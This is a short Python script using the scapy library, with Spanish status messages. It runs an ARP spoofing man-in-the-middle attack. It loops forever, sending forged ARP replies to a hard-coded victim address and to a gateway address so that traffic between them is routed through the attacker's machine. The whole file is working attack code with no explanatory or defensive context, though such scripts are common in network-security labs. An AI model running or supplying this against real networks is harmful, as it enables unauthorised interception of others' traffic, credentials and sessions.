from scapy.all import ARP, send
import time

victim_ip = "12.0.0.20"
gateway_ip = "12.0.0.1"

print("[*] Iniciando ARP MITM")

try:
    while True:
        send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip), verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Ataque detenido")